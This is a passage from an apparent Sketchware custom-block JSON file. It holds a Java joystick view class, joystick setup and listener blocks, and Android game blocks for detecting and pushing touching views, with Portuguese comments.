Paint();\n\t\t\t\tmPaintCircleBorder.setAntiAlias(true);\n\t\t\t\tmPaintCircleBorder.setColor(borderColor);\n\t\t\t\tmPaintCircleBorder.setStyle(Paint.Style.STROKE);\n\t\t\t\tmPaintCircleBorder.setStrokeWidth(borderWidth);\n\t\t\t\t\n\t\t\t\tif (borderColor !\u003d Color.TRANSPARENT) {\n\t\t\t\t\t\tmPaintCircleBorder.setAlpha(mBorderAlpha);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tmPaintBackground \u003d new Paint();\n\t\t\t\tmPaintBackground.setAntiAlias(true);\n\t\t\t\tmPaintBackground.setColor(backgroundColor);\n\t\t\t\tmPaintBackground.setStyle(Paint.Style.FILL);\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t// Init Runnable for MultiLongPress\n\t\t\t\t\n\t\t\t\tmRunnableMultipleLongPress \u003d new Runnable() {\n\t\t\t\t\t\t@Override\n\t\t\t\t\t\tpublic void run() {\n\t\t\t\t\t\t\t\tif (mOnMultipleLongPressListener !\u003d null)\n\t\t\t\t\t\t\t\tmOnMultipleLongPressListener.onMultipleLongPress();\n\t\t\t\t\t\t}\n\t\t\t\t};\n\t\t}\n\t\t\n\t\t\n\t\tprivate void initPosition() {\n\t\t\t\t// get the center of view to position circle\n\t\t\t\tmFixedCenterX \u003d mCenterX \u003d mPosX \u003d getWidth() / 2;\n\t\t\t\tmFixedCenterY \u003d mCenterY \u003d mPosY \u003d getWidth() / 2;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\t@Override\n\t\tprotected void onDraw(Canvas canvas) {\n\t\t\t\t// Draw the background\n\t\t\t\tcanvas.drawCircle(mFixedCenterX, mFixedCenterY, mBackgroundRadius, mPaintBackground);\n\t\t\t\t\n\t\t\t\t// Draw the circle border\n\t\t\t\tcanvas.drawCircle(mFixedCenterX, mFixedCenterY, mBorderRadius, mPaintCircleBorder);\n\t\t\t\t\n\t\t\t\t// Draw the button from image\n\t\t\t\tif (mButtonBitmap !\u003d null) {\n\t\t\t\t\t\tcanvas.drawBitmap(\n\t\t\t\t\t\tmButtonBitmap,\n\t\t\t\t\t\tmPosX + mFixedCenterX - mCenterX - mButtonRadius,\n\t\t\t\t\t\tmPosY + mFixedCenterY - mCenterY - mButtonRadius,\n\t\t\t\t\t\tmPaintBitmapButton\n\t\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\t// Draw the button as simple circle\n\t\t\t\telse {\n\t\t\t\t\t\tcanvas.drawCircle(\n\t\t\t\t\t\tmPosX + mFixedCenterX - mCenterX,\n\t\t\t\t\t\tmPosY + mFixedCenterY - mCenterY,\n\t\t\t\t\t\tmButtonRadius,\n\t\t\t\t\t\tmPaintCircleButton\n\t\t\t\t\t\t);\n\t\t\t\t}\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\t@Override\n\t\tprotected void onSizeChanged(int w, int h, int oldW, int oldH) {\n\t\t\t\tsuper.onSizeChanged(w, h, oldW, oldH);\n\t\t\t\t\n\t\t\t\tinitPosition();\n\t\t\t\t\n\t\t\t\t// radius based on smallest size : height OR width\n\t\t\t\tint d \u003d Math.min(w, h);\n\t\t\t\tmButtonRadius \u003d (int) (d / 2 * mButtonSizeRatio);\n\t\t\t\tmBorderRadius \u003d (int) (d / 2 * mBackgroundSizeRatio);\n\t\t\t\tmBackgroundRadius \u003d mBorderRadius - (mPaintCircleBorder.getStrokeWidth() / 2);\n\t\t\t\t\n\t\t\t\tif (mButtonBitmap !\u003d null)\n\t\t\t\tmButtonBitmap \u003d Bitmap.createScaledBitmap(mButtonBitmap, mButtonRadius * 2, mButtonRadius * 2, true);\n\t\t}\n\t\t\n\t\t\n\t\t@Override\n\t\tprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n\t\t\t\t// setting the measured values to resize the view to a certain width and height\n\t\t\t\tint d \u003d Math.min(measure(widthMeasureSpec), measure(heightMeasureSpec));\n\t\t\t\tsetMeasuredDimension(d, d);\n\t\t}\n\t\t\n\t\t\n\t\tprivate int measure(int measureSpec) {\n\t\t\t\tif (MeasureSpec.getMode(measureSpec) \u003d\u003d MeasureSpec.UNSPECIFIED) {\n\t\t\t\t\t\t// if no bounds are specified return a default size (200)\n\t\t\t\t\t\treturn DEFAULT_SIZE;\n\t\t\t\t} else {\n\t\t\t\t\t\t// As you want to fill the available space\n\t\t\t\t\t\t// always return the full available bounds.\n\t\t\t\t\t\treturn MeasureSpec.getSize(measureSpec);\n\t\t\t\t}\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\t@Override\n\t\tpublic boolean onTouchEvent(MotionEvent event) {\n\t\t\t\t// if disabled we don\u0027t move the\n\t\t\t\tif (!mEnabled) {\n\t\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t// to move the button according to the finger coordinate\n\t\t\t\t// (or limited to one axe according to direction option\n\t\t\t\tmPosY \u003d mButtonDirection \u003c 0 ? mCenterY : (int) event.getY(); // direction negative is horizontal axe\n\t\t\t\tmPosX \u003d mButtonDirection \u003e 0 ? mCenterX : (int) event.getX(); // direction positive is vertical axe\n\t\t\t\t\n\t\t\t\tif (event.getAction() \u003d\u003d MotionEvent.ACTION_UP) {\n\t\t\t\t\t\t\n\t\t\t\t\t\t// stop listener because the finger left the touch screen\n\t\t\t\t\t\tmThread.interrupt();\n\t\t\t\t\t\t\n\t\t\t\t\t\t// re-center the button or not (depending on settings)\n\t\t\t\t\t\tif (mAutoReCenterButton) {\n\t\t\t\t\t\t\t\tresetButtonPosition();\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// update now the last strength and angle which should be zero after resetButton\n\t\t\t\t\t\t\t\tif (mCallback !\u003d null)\n\t\t\t\t\t\t\t\tmCallback.onMove(getAngle(), getStrength());\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\t// if mAutoReCenterButton is false we will send the last strength and angle a bit\n\t\t\t\t\t\t// later only after processing new position X and Y otherwise it could be above the border limit\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif (event.getAction() \u003d\u003d MotionEvent.ACTION_DOWN) {\n\t\t\t\t\t\tif (mThread !\u003d null \u0026\u0026 mThread.isAlive()) {\n\t\t\t\t\t\t\t\tmThread.interrupt();\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\tmThread \u003d new Thread(this);\n\t\t\t\t\t\tmThread.start();\n\t\t\t\t\t\t\n\t\t\t\t\t\tif (mCallback !\u003d null)\n\t\t\t\t\t\tmCallback.onMove(getAngle(), getStrength());\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t// handle first touch and long press with multiple touch only\n\t\t\t\tswitch (event.getActionMasked()) {\n\t\t\t\t\t\tcase MotionEvent.ACTION_DOWN:\n\t\t\t\t\t\t// when the first touch occurs we update the center (if set to auto-defined center)\n\t\t\t\t\t\tif (!mFixedCenter) {\n\t\t\t\t\t\t\t\tmCenterX \u003d mPosX;\n\t\t\t\t\t\t\t\tmCenterY \u003d mPosY;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\n\t\t\t\t\t\tcase MotionEvent.ACTION_POINTER_DOWN: {\n\t\t\t\t\t\t\t\t// when the second finger touch\n\t\t\t\t\t\t\t\tif (event.getPointerCount() \u003d\u003d 2) {\n\t\t\t\t\t\t\t\t\t\tmHandlerMultipleLongPress.postDelayed(mRunnableMultipleLongPress, ViewConfiguration.getLongPressTimeout()*2);\n\t\t\t\t\t\t\t\t\t\tmMoveTolerance \u003d MOVE_TOLERANCE;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\tcase MotionEvent.ACTION_MOVE:\n\t\t\t\t\t\tmMoveTolerance--;\n\t\t\t\t\t\tif (mMoveTolerance \u003d\u003d 0) {\n\t\t\t\t\t\t\t\tmHandlerMultipleLongPress.removeCallbacks(mRunnableMultipleLongPress);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\n\t\t\t\t\t\tcase MotionEvent.ACTION_POINTER_UP: {\n\t\t\t\t\t\t\t\t// when the last multiple touch is released\n\t\t\t\t\t\t\t\tif (event.getPointerCount() \u003d\u003d 2) {\n\t\t\t\t\t\t\t\t\t\tmHandlerMultipleLongPress.removeCallbacks(mRunnableMultipleLongPress);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tdouble abs \u003d Math.sqrt((mPosX - mCenterX) * (mPosX - mCenterX)\n\t\t\t\t+ (mPosY - mCenterY) * (mPosY - mCenterY));\n\t\t\t\t\n\t\t\t\t// (abs \u003e mBorderRadius) means button is too far therefore we limit to border\n\t\t\t\t// (buttonStickBorder \u0026\u0026 abs !\u003d 0) means wherever is the button we stick it to the border except when abs \u003d\u003d 0\n\t\t\t\tif (abs \u003e mBorderRadius || (mButtonStickToBorder \u0026\u0026 abs !\u003d 0)) {\n\t\t\t\t\t\tmPosX \u003d (int) ((mPosX - mCenterX) * mBorderRadius / abs + mCenterX);\n\t\t\t\t\t\tmPosY \u003d (int) ((mPosY - mCenterY) * mBorderRadius / abs + mCenterY);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif (!mAutoReCenterButton) {\n\t\t\t\t\t\t// Now update the last strength and angle if not reset to center\n\t\t\t\t\t\tif (mCallback !\u003d null)\n\t\t\t\t\t\tmCallback.onMove(getAngle(), getStrength());\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t// to force a new draw\n\t\t\t\tinvalidate();\n\t\t\t\t\n\t\t\t\treturn true;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tprivate int getAngle() {\n\t\t\t\tint angle \u003d (int) Math.toDegrees(Math.atan2(mCenterY - mPosY, mPosX - mCenterX));\n\t\t\t\treturn angle \u003c 0 ? angle + 360 : angle; // make it as a regular counter-clock protractor\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tprivate int getStrength() {\n\t\t\t\treturn (int) (100 * Math.sqrt((mPosX - mCenterX)\n\t\t\t\t* (mPosX - mCenterX) + (mPosY - mCenterY)\n\t\t\t\t* (mPosY - mCenterY)) / mBorderRadius);\n\t\t}\n\t\t\n\t\t\n\t\t/**\n* Reset the button position to the center.\n*/\n\t\tpublic void resetButtonPosition() {\n\t\t\t\tmPosX \u003d mCenterX;\n\t\t\t\tmPosY \u003d mCenterY;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic int getButtonDirection() {\n\t\t\t\treturn mButtonDirection;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic boolean isEnabled() {\n\t\t\t\treturn mEnabled;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic float getButtonSizeRatio() {\n\t\t\t\treturn mButtonSizeRatio;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic float getmBackgroundSizeRatio() {\n\t\t\t\treturn mBackgroundSizeRatio;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic boolean isAutoReCenterButton() {\n\t\t\t\treturn mAutoReCenterButton;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic boolean isButtonStickToBorder() {\n\t\t\t\treturn mButtonStickToBorder;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic int getNormalizedX() {\n\t\t\t\tif (getWidth() \u003d\u003d 0) {\n\t\t\t\t\t\treturn 50;\n\t\t\t\t}\n\t\t\t\treturn Math.round((mPosX-mButtonRadius)*100.0f/(getWidth()-mButtonRadius*2));\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic int getNormalizedY() {\n\t\t\t\tif (getHeight() \u003d\u003d 0) {\n\t\t\t\t\t\treturn 50;\n\t\t\t\t}\n\t\t\t\treturn Math.round((mPosY-mButtonRadius)*100.0f/(getHeight()-mButtonRadius*2));\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic int getBorderAlpha() {\n\t\t\t\treturn mBorderAlpha;\n\t\t}\n\t\t\n\t\t\n\t\tpublic void setButtonDrawable(android.graphics.drawable.Drawable d) {\n\t\t\t\tif (d !\u003d null) {\n\t\t\t\t\t\tif (d instanceof android.graphics.drawable.BitmapDrawable) {\n\t\t\t\t\t\t\t\tmButtonBitmap \u003d ((android.graphics.drawable.BitmapDrawable) d).getBitmap();\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif (mButtonRadius !\u003d 0) {\n\t\t\t\t\t\t\t\t\t\tmButtonBitmap \u003d Bitmap.createScaledBitmap(\n\t\t\t\t\t\t\t\t\t\tmButtonBitmap,\n\t\t\t\t\t\t\t\t\t\tmButtonRadius * 2,\n\t\t\t\t\t\t\t\t\t\tmButtonRadius * 2,\n\t\t\t\t\t\t\t\t\t\ttrue);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif (mPaintBitmapButton !\u003d null)\n\t\t\t\t\t\t\t\tmPaintBitmapButton \u003d new Paint();\n\t\t\t\t\t\t}\n\t\t\t\t}\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setButtonColor(int color) {\n\t\t\t\tmPaintCircleButton.setColor(color);\n\t\t\t\tinvalidate();\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setBorderColor(int color) {\n\t\t\t\tmPaintCircleBorder.setColor(color);\n\t\t\t\tif (color !\u003d Color.TRANSPARENT) {\n\t\t\t\t\t\tmPaintCircleBorder.setAlpha(mBorderAlpha);\n\t\t\t\t}\n\t\t\t\tinvalidate();\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setBorderAlpha(int alpha) {\n\t\t\t\tmBorderAlpha \u003d alpha;\n\t\t\t\tmPaintCircleBorder.setAlpha(alpha);\n\t\t\t\tinvalidate();\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\t@Override\n\t\tpublic void setBackgroundColor(int color) {\n\t\t\t\tmPaintBackground.setColor(color);\n\t\t\t\tinvalidate();\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setBorderWidth(int width) {\n\t\t\t\tmPaintCircleBorder.setStrokeWidth(width);\n\t\t\t\tmBackgroundRadius \u003d mBorderRadius - (width / 2.0f);\n\t\t\t\tinvalidate();\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setOnMoveListener(OnMoveListener l) {\n\t\t\t\tsetOnMoveListener(l, DEFAULT_LOOP_INTERVAL);\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setOnMoveListener(OnMoveListener l, int loopInterval) {\n\t\t\t\tmCallback \u003d l;\n\t\t\t\tmLoopInterval \u003d loopInterval;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setOnMultiLongPressListener(OnMultipleLongPressListener l) {\n\t\t\t\tmOnMultipleLongPressListener \u003d l;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setFixedCenter(boolean fixedCenter) {\n\t\t\t\t// if we set to \"fixed\" we make sure to re-init position related to the width of the joystick\n\t\t\t\tif (fixedCenter) {\n\t\t\t\t\t\tinitPosition();\n\t\t\t\t}\n\t\t\t\tmFixedCenter \u003d fixedCenter;\n\t\t\t\tinvalidate();\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setEnabled(boolean enabled) {\n\t\t\t\tmEnabled \u003d enabled;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setButtonSizeRatio(float newRatio) {\n\t\t\t\tif (newRatio \u003e 0.0f \u0026 newRatio \u003c\u003d 1.0f) {\n\t\t\t\t\t\tmButtonSizeRatio \u003d newRatio;\n\t\t\t\t}\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setBackgroundSizeRatio(float newRatio) {\n\t\t\t\tif (newRatio \u003e 0.0f \u0026 newRatio \u003c\u003d 1.0f) {\n\t\t\t\t\t\tmBackgroundSizeRatio \u003d newRatio;\n\t\t\t\t}\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setAutoReCenterButton(boolean b) {\n\t\t\t\tmAutoReCenterButton \u003d b;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setButtonStickToBorder(boolean b) {\n\t\t\t\tmButtonStickToBorder \u003d b;\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic void setButtonDirection(int direction) {\n\t\t\t\tmButtonDirection \u003d direction;\n\t\t}\n\t\t\n\t\t\n\t\t/*\nIMPLEMENTS\n*/\n\t\t\n\t\t\n\t\t@Override // Runnable\n\t\tpublic void run() {\n\t\t\t\twhile (!Thread.interrupted()) {\n\t\t\t\t\t\tpost(new Runnable() {\n\t\t\t\t\t\t\t\tpublic void run() {\n\t\t\t\t\t\t\t\t\t\tif (mCallback !\u003d null)\n\t\t\t\t\t\t\t\t\t\tmCallback.onMove(getAngle(), getStrength());\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\t\t\t\t\t\t\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\tThread.sleep(mLoopInterval);\n\t\t\t\t\t\t} catch (InterruptedException e) {\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t}\n\t\t}\n}\n\r\n{","color":"#FF4A148C","typeName":"","name":"Joystick Library | place in moreblock Library","palette":"249","type":" ","spec":"Joystick Library | place in moreblock Library"},{"code":"","color":"#FF4A148C","typeName":"","name":"Oncreate Activity logic (By Isaac Rufus)","palette":"249","type":"h","spec":"Oncreate Activity logic  | By Isaac Rufus"},{"code":"%1$s \u003d new JoystickView(this);\nViewGroup parent \u003d (ViewGroup) %2$s.getParent();\nint index \u003d parent.indexOfChild(%2$s);\nparent.removeView(%2$s);\nparent.addView(%1$s, index);\n","color":"#FF4A148C","typeName":"","name":"Create Joystick with name in Activity","palette":"249","type":" ","spec":"Create Joystick with name %m.joystick in this Activity on %m.view "},{"code":"%1$s.setButtonColor(%2$s);","color":"#FF4A148C","typeName":"","name":"Joystick Color","palette":"249","type":" ","spec":"%m.joystick setButtonColor %m.color "},{"code":"{\n\tViewGroup.LayoutParams params \u003d new TableLayout.LayoutParams();\n\ttry {\n\t\tparams \u003d %1$s.getLayoutParams();\n\t} catch (Exception e) {\n\t}\n\t\t\t\t//params.height \u003d android.view.ViewGroup.LayoutParams.WRAP_CONTENT;\n\t\t\t\t//params.width \u003d android.view.ViewGroup.LayoutParams.WRAP_CONTENT;\n\t\t\t\tparams.height \u003d %3$s;\n\t\t\t\tparams.width \u003d %2$s;\n\t\t\t\t%1$s.setLayoutParams(params);\n}\r\n","color":"#FF4A148C","typeName":"","name":"Joystick width and height","palette":"249","type":" ","spec":"%m.joystick setWidth %d  setHeight %d "},{"code":"%1$s.setButtonSizeRatio(%2$s);","color":"#FF4A148C","typeName":"","name":"Button size","palette":"249","type":" ","spec":"%m.joystick setButtonSizeRatio %d "},{"code":"%1$s.setButtonStickToBorder(%2$s);","color":"#FF4A148C","typeName":"","name":"Button to border","palette":"249","type":" ","spec":"%m.joystick setButtonStickToBorder %b "},{"code":"%1$s.setBorderWidth(%2$s);\n%1$s.setFixedCenter(false);","color":"#FF4A148C","typeName":"","name":"Button border width","palette":"249","type":" ","spec":"%m.joystick setBorderWidth %d "},{"code":"%1$s.setBorderColor(%2$s);","color":"#FF4A148C","typeName":"","name":"Border color","palette":"249","type":" ","spec":"%m.joystick setBorderColor %m.color "},{"code":"%1$s.setBackgroundColor(%2$s);","color":"#FF4A148C","typeName":"","name":"Background color","palette":"249","type":" ","spec":"%m.joystick setBackgroundColor %m.color "},{"code":"%1$s.setFixedCenter(%2$s);","color":"#FF4A148C","typeName":"","name":"Fixed center","palette":"249","type":" ","spec":"%m.joystick setFixedCenter %b "},{"code":"","color":"#FF000000","typeName":"","name":"Listener Blocks","palette":"249","type":"h","spec":"Listener blocks(By Isaacware, The Internet Skills Youtube Channel) "},{"code":"%1$s.setOnMoveListener(new JoystickView.OnMoveListener() {\n\t@Override\n\tpublic void onMove(int angle, int strength) {\n\t\t %2$s\n\t}\n});","color":"#FF4A148C","typeName":"String","name":"onMoveListener","palette":"249","type":"c","spec":"%m.joystick onMoveListener"},{"code":"%1$s.setOnMultiLongPressListener(new JoystickView.OnMultipleLongPressListener() {\n\t@Override\n\tpublic void onMultipleLongPress() {\n%2$s\n\t}\n});","color":"#FF4A148C","typeName":"String","name":"onLongPressed","palette":"249","type":"c","spec":"%m.joystick onMultiLongPressedListener"},{"code":"angle","color":"#FF4A148C","typeName":"","name":"get angle","palette":"249","type":"d","spec":"getAngle"},{"code":"strength","color":"#FF4A148C","typeName":"","name":"get strength","palette":"249","type":"d","spec":"getStrength"},{"code":"joystick","color":"#FF4A148C","typeName":"joystick","name":"joystick","palette":"249","type":"p","spec":"Joystick"},{"code":"speed \u003d %2$s;\n// is moving up and left\nif (!(angle \u003e 170) \u0026\u0026 !(angle \u003c 100)) {\n\tisMovingLeft \u003d true;\n\tisMovingUp \u003d true;\n\tisMovingRight \u003d false;\n\tisMovingDown \u003d false;\n}\n// is moving down and left\nif (!(angle \u003e 260) \u0026\u0026 !(angle \u003c 190)) {\n\tisMovingLeft \u003d true;\n\tisMovingUp \u003d false;\n\tisMovingRight \u003d false;\n\tisMovingDown \u003d true;\n}\n// is moving up and right\nif (!(angle \u003e 80) \u0026\u0026 !(angle \u003c 10)) {\n\tisMovingLeft \u003d false;\n\tisMovingUp \u003d true;\n\tisMovingDown \u003d false;\n\tisMovingRight \u003d true;\n}\n// is moving down and right\nif (!(angle \u003e 350) \u0026\u0026 !(angle \u003c 280)) {\n\tisMovingLeft \u003d false;\n\tisMovingUp \u003d false;\n\tisMovingDown \u003d true;\n\tisMovingRight \u003d true;\n}\n// is moving down\nif (!(angle \u003e 280) \u0026\u0026 !(angle \u003c 260)) {\n\tisMovingLeft \u003d false;\n\tisMovingUp \u003d false;\n\tisMovingDown \u003d true;\n\tisMovingRight \u003d false;\n}\n// is moving up\nif (!(angle \u003e 100) \u0026\u0026 !(angle \u003c 80)) {\n\tisMovingLeft \u003d false;\n\tisMovingUp \u003d true;\n\tisMovingDown \u003d false;\n\tisMovingRight \u003d false;\n}\n// is moving right\nif ((!(angle \u003e 359) \u0026\u0026 !(angle \u003c 350)) || !(angle \u003e 10)) {\n\tisMovingLeft \u003d false;\n\tisMovingUp \u003d false;\n\tisMovingDown \u003d false;\n\tisMovingRight \u003d true;\n}\n// is moving left\nif (!(angle \u003e 190) \u0026\u0026 !(angle \u003c 170)) {\n\tisMovingLeft \u003d true;\n\tisMovingUp \u003d false;\n\tisMovingDown \u003d false;\n\tisMovingRight \u003d false;\n}\nif (isMovingLeft) {\n\t%1$s.setTranslationX((float)(ball.getTranslationX() - (strength / speed)));\n}\nif (isMovingRight) {\n\t%1$s.setTranslationX((float)(ball.getTranslationX() + (strength / speed)));\n}\nif (isMovingUp) {\n\t%1$s.setTranslationY((float)(ball.getTranslationY() - (strength / speed)));\n}\nif (isMovingDown) {\n\t%1$s.setTranslationY((float)(ball.getTranslationY() + (strength / speed)));\n}\n\n// DO NOT DELETE THIS\n}\n\nprivate double speed \u003d 0; // set target moving speed\nprivate boolean isMovingDown; // set target moving down\nprivate boolean isMovingUp; //set target moving up\nprivate boolean isMovingLeft; //set target moving left\nprivate boolean isMovingRight; //set target moving right\n{","color":"#FF4A148C","typeName":"","name":"setJoystickTarget","palette":"249","type":" ","spec":"setJoystickViewTarget %m.view  setSpeed %d "},{"code":"","color":"#FFF44336","name":"","typeName":"","palette":"249","type":"h","spec":"game blocks "},{"code":"float v1X \u003d %1$s.getX();\nfloat v1Y \u003d %1$s.getY();\nfloat v1W \u003d %1$s.getWidth();\nfloat v1H \u003d %1$s.getHeight();\n\nfloat v2X \u003d %2$s.getX();\nfloat v2Y \u003d %2$s.getY();\nfloat v2W \u003d %2$s.getWidth();\nfloat v2H \u003d %2$s.getHeight();\n\nif ((v1X \u003c v2X + v2W) \u0026\u0026 \n    (v1X + v1W \u003e v2X) \u0026\u0026 \n    (v1Y \u003c v2Y + v2H) \u0026\u0026 \n    (v1Y + v1H \u003e v2Y)) {\n    // As views estão encostando\n    // Adicione aqui o código que deseja executar\n    %3$s\n}else{\n%4$s\n}","color":"#FF7E57C2","name":"if view touch","typeName":"","palette":"244","type":"e","spec":"se view:%m.view tocar view:%m.view ","spec2":"else"},{"code":"float v1X%3$s \u003d %1$s.getX();\nfloat v1Y%3$s \u003d %1$s.getY();\nfloat v1W%3$s \u003d %1$s.getWidth();\nfloat v1H%3$s \u003d %1$s.getHeight();\n\nfloat v2X%3$s \u003d %2$s.getX();\nfloat v2Y%3$s \u003d %2$s.getY();\nfloat v2W%3$s \u003d %2$s.getWidth();\nfloat v2H%3$s \u003d %2$s.getHeight();\n\nif ((v1X%3$s \u003c v2X%3$s + v2W%3$s) \u0026\u0026 \n    (v1X%3$s + v1W%3$s \u003e v2X%3$s) \u0026\u0026 \n    (v1Y%3$s \u003c v2Y%3$s + v2H%3$s) \u0026\u0026 \n    (v1Y%3$s + v1H%3$s \u003e v2Y%3$s)) {\n    // As views estão encostando\n    // Adicione aqui o código que deseja executar\n    %4$s\n}else{\n%5$s\n}","color":"#FF7E57C2","name":"if views touch","typeName":"","palette":"249","type":"e","spec":"Se View:%m.view tocar %m.view  id:%d ","spec2":"else"},{"code":"// Dentro do evento onde você está verificando a colisão\n\nint view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\n// Verifica se há colisão entre %1$s e %2$s\nif (view1X%3$s \u003c view2X%3$s + view2Width%3$s \u0026\u0026\n    view1X%3$s + view1Width%3$s \u003e view2X%3$s \u0026\u0026\n    view1Y%3$s \u003c view2Y%3$s + view2Height%3$s \u0026\u0026\n    view1Y%3$s + view1Height%3$s \u003e view2Y%3$s) {\n\n    // Calcula a diferença nas coordenadas X e Y\n    int deltaX%3$s \u003d Math.abs((view1X%3$s + view1Width%3$s / 2) - (view2X%3$s + view2Width%3$s / 2));\n    int deltaY%3$s \u003d Math.abs((view1Y%3$s + view1Height%3$s / 2) - (view2Y%3$s + view2Height%3$s / 2));\n\n    if (deltaX%3$s \u003e deltaY%3$s) {\n        // Empurrar horizontalmente\n        if (view1X%3$s \u003c view2X%3$s) {\n            %2$s.setX(view2X%3$s + view1Width%3$s); // Empurrar para a direita\n        } else {\n            %2$s.setX(view2X%3$s - view1Width%3$s); // Empurrar para a esquerda\n        }\n    } else {\n        // Empurrar verticalmente\n        if (view1Y%3$s \u003c view2Y%3$s) {\n            %2$s.setY(view2Y%3$s + view1Height%3$s); // Empurrar para baixo\n        } else {\n            %2$s.setY(view2Y%3$s - view1Height%3$s); // Empurrar para cima\n        }\n    }\n}","color":"#FF7E57C2","name":"if views touch_copy23","typeName":"","palette":"249","type":"c","spec":"View:%m.view empurra %m.view id:%d ","spec2":"else"},{"code":"// Dentro do evento onde você está verificando a colisão\n\n// Obtenha o layout pai das views\nView parentLayout \u003d (View) %1$s.getParent();\n\n// Obtenha as dimensões do layout pai\nint containerWidth \u003d parentLayout.getWidth();\nint containerHeight \u003d parentLayout.getHeight();\n\n// Código de verificação de colisão e movimento (como antes)\nint view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\nint pushFactor \u003d 10; // Fator de suavidade para o empurrão\n\nif (view1X%3$s \u003c view2X%3$s + view2Width%3$s \u0026\u0026\n    view1X%3$s + view1Width%3$s \u003e view2X%3$s \u0026\u0026\n    view1Y%3$s \u003c view2Y%3$s + view2Height%3$s \u0026\u0026\n    view1Y%3$s + view1Height%3$s \u003e view2Y%3$s) {\n\n    // Calcula a diferença nas coordenadas X e Y\n    int deltaX%3$s \u003d Math.abs((view1X%3$s + view1Width%3$s / 2) - (view2X%3$s + view2Width%3$s / 2));\n    int deltaY%3$s \u003d Math.abs((view1Y%3$s + view1Height%3$s / 2) - (view2Y%3$s + view2Height%3$s / 2));\n\n    if (deltaX%3$s \u003e deltaY%3$s) {\n        // Empurrar horizontalmente\n        if (view1X%3$s \u003c view2X%3$s \u0026\u0026 view2X%3$s + view2Width%3$s + pushFactor \u003c containerWidth) {\n            %2$s.setX(view2X%3$s + pushFactor); // Empurrar para a direita\n        } else if (view1X%3$s \u003e view2X%3$s \u0026\u0026 view2X%3$s - pushFactor \u003e 0) {\n            %2$s.setX(view2X%3$s - pushFactor); // Empurrar para a esquerda\n        }\n    } else {\n        // Empurrar verticalmente\n        if (view1Y%3$s \u003c view2Y%3$s \u0026\u0026 view2Y%3$s + view2Height%3$s + pushFactor \u003c containerHeight) {\n            %2$s.setY(view2Y%3$s + pushFactor); // Empurrar para baixo\n        } else if (view1Y%3$s \u003e view2Y%3$s \u0026\u0026 view2Y%3$s - pushFactor \u003e 0) {\n            %2$s.setY(view2Y%3$s - pushFactor); // Empurrar para cima\n        }\n    }\n}","color":"#FF7E57C2","name":"if views 